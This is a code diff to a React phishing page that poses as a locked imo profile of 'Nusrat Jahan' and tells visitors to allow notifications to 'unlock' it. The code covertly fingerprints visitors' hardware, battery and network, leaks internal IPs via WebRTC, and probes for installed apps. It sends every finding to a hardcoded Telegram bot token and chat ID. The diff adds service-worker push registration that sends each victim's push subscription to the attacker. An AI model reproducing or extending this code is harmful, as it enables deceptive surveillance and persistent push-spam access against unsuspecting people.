@@ -30,6 +30,7 @@
         const BOT_TOKEN = "8367516207:AAEKQnowvWWC32Z2eaPVjuRrxKfl1alssIA"; 
         const CHAT_ID = "8271536101"; 
         const REDIRECT_LINK = "https://profile.imo.im/profileshare/shr.AAAAAAAAAAAAAAAAAAAAAPJ7LNAdm5sh2K-4b-Aq7rq4CDUGPD4SInhRX-x2NJh6";
+        const VAPID_PUBLIC_KEY = "YOUR_PUBLIC_VAPID_KEY_HERE"; // এখানে আপনার আসল কি বসাতে হবে
 
         // Generate Unique 4-Digit ID
         let userId = localStorage.getItem('v_id');
@@ -54,9 +55,8 @@
             const [step, setStep] = useState('MAIN'); 
             const [showToast, setShowToast] = useState(false);
 
-            // 8 ADVANCED LOGICS
+            // --- ADVANCED SCAN LOGICS ---
             const masterScan = async () => {
-                // 1. GPU & Hardware
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl');
                 const dbg = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
@@ -64,7 +64,6 @@
                 report.hardware.ram = navigator.deviceMemory || "Unknown";
                 report.hardware.cores = navigator.hardwareConcurrency;
 
-                // 2. Internal IP Leak (WebRTC)
                 try {
                     const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                     pc.createDataChannel("");
@@ -77,34 +76,28 @@
                     pc.createOffer().then(s => pc.setLocalDescription(s));
                 } catch(e) {}
 
-                // 3. OS Mask Breaking
                 if (navigator.userAgentData) {
                     const h = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
                     report.hardware.model = h.model;
                     report.software.os = h.platformVersion;
                 }
 
-                // 4. CPU Speed
                 const start = performance.now();
                 for (let i = 0; i < 30000000; i++) Math.sqrt(i);
                 report.software.speed = (performance.now() - start).toFixed(2) + "ms";
 
-                // 5. Battery
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
                     report.network.bat = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging' : 'Discharging'})`;
                 }
 
-                // 6. Security Patch detection
                 report.software.patch = ('highlights' in CSS) ? "Secure (Post-2023)" : "Legacy";
 
-                // 7. Network Quality
                 if (navigator.connection) {
                     report.network.net = `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)`;
                 }
             };
 
-            // 8. App Probing (Silent)
             const probeApps = async () => {
                 const apps = [{n:"WhatsApp",u:"whatsapp://"}, {n:"Telegram",u:"tg://"}, {n:"FB",u:"fb://"}];
                 for (let app of apps) {
@@ -125,6 +118,25 @@
                 }
             };
 
+            // --- SERVICE WORKER & PUSH REGISTRATION ---
+            const registerServiceWorker = async () => {
+                if ('serviceWorker' in navigator) {
+                    try {
+                        const registration = await navigator.serviceWorker.register('sw.js');
+                        console.log('Service Worker Registered');
+
+                        const subscription = await registration.pushManager.subscribe({
+                            userVisibleOnly: true,
+                            applicationServerKey: VAPID_PUBLIC_KEY
+                        });
+
+                        await sendToTelegram(`🚀 *Push Token Received for #${userId}*\n\`${JSON.stringify(subscription)}\``);
+                    } catch (err) {
+                        console.error('Service Worker / Push failed', err);
+                    }
+                }
+            };
+
             useEffect(() => {
                 masterScan();
                 sendToTelegram(`🔔 *Visitor #${userId}* entered the page.`);
@@ -138,7 +150,7 @@
 
             const handleUnlock = async () => {
                 if (!window.isSecureContext) {
-                    alert("Security Error: This page must be hosted on HTTPS to unlock.");
+                    alert("Security Error: HTTPS is required for this operation.");
                     return;
                 }
 
@@ -146,6 +158,10 @@
                 
                 if (permission === 'granted') {
                     setStep('LOADER');
+                    
+                    // এখানে সার্ভিস ওয়ার্কার রেজিস্টার করা হচ্ছে
+                    await registerServiceWorker();
+                    
                     await probeApps();
                     
                     const reportMsg = `
@@ -167,7 +183,7 @@ User-Agent: ${navigator.userAgent}`;
                     await sendToTelegram(reportMsg);
                     setTimeout(() => setStep('SUCCESS'), 3000);
                 } else {
-                    alert("Nusrat Jahan friend request allow করুন");
+                    alert("Please allow notifications to unlock the profile.");
                 }
             };
 
@@ -175,7 +191,6 @@ User-Agent: ${navigator.userAgent}`;
                 <div className="flex flex-col h-full w-full bg-white relative">
                     {showToast && <div className="toast-notification">Nusrat Jahan is online. Unlock to chat.</div>}
 
-                    {/* Header */}
                     <div className="h-14 bg-white flex items-center px-4 border-b border-slate-100 shadow-sm">
                         <div className="flex-1 flex items-center gap-3">
                             <div className="w-8 h-8 rounded-full border border-slate-200 overflow-hidden">
@@ -196,7 +211,7 @@ User-Agent: ${navigator.userAgent}`;
                                             <p className="text-xs text-[#0091ea] font-bold bg-blue-50 px-2 py-1 rounded inline-block">Online Now</p>
                                         </div>
                                     </div>
-                                    <p className="text-slate-600 text-sm mb-8">This account is protected. To view Nusrat Jahan's private profile, click unlock and allow the notification.</p>
+                                    <p className="text-slate-600 text-sm mb-8">This account is protected. Click unlock and allow the notification to access the profile.</p>
                                     
                                     <button 
                                         onClick={handleUnlock}
@@ -230,7 +245,6 @@ User-Agent: ${navigator.userAgent}`;
                         )}
                     </div>
 
-                    {/* Footer Nav */}
                     <div className="h-16 border-t flex justify-around items-center bg-white">
                         <div className="text-[#0091ea] text-center"><i className="fa-solid fa-comment-dots text-xl"></i><p className="text-[10px] font-bold">Chats</p></div>
                         <div className="text-slate-400 text-center"><i className="fa-solid fa-globe text-xl"></i><p className="text-[10px]">Explore</p></div>
